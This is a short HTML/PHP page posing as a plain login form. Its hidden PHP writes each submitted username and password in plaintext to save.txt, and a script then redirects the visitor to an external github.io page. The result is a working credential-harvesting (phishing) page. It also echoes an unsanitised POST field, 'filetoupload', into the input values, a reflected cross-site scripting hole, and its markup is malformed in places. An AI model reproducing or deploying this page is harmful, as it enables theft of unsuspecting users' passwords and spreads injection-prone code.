<!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <form action="index.php" method="POST"></form>
    <div class="login-box">
        <h2>Login</h2>
        <form method="post">
          <div class="user-box">
            <input type="text" name="textdata" required="" value="<?php if(isset($_POST['filetoupload'])) echo $_POST['filetoupload']; ?>">
            <label>Username</label>
          </div>
          <div class="user-box">
            <input type="password" name="textda" required="" value="<?php if(isset($_POST['filetoupload'])) echo $_POST['filetoupload']; ?>">
            <label>Password</label>
            <!-- <a href="https://sudip-13.github.io/page2/"><input type="Submit" value="SUBMIT" ></a> -->
          <div class = "submit">
            <button id="submit">SUBMIT</button>



          <script>
              document.getElementById("submit").addEventListener("click", function() {
                  window.location.href = "https://sudip-13.github.io/page2/";
              });
          </script>


        </form>
        <?php    
        if(isset($_POST['textdata'])){
        $data=$_POST['textdata'];
        $tx = "User Name: ";
        $fp = fopen('save.txt', 'w');
        fwrite($fp, $tx);
        fwrite($fp, $data);
        fclose($fp);
        }
        if(isset($_POST['textda'])){
        $data=$_POST['textda'];
        $tx = "\nPassword: ";
        $fp = fopen('save.txt', 'a');
        fwrite($fp, $tx);
        fwrite($fp, $data);
        fclose($fp);
        }
        ?>
      </div>
  </body>
  </html>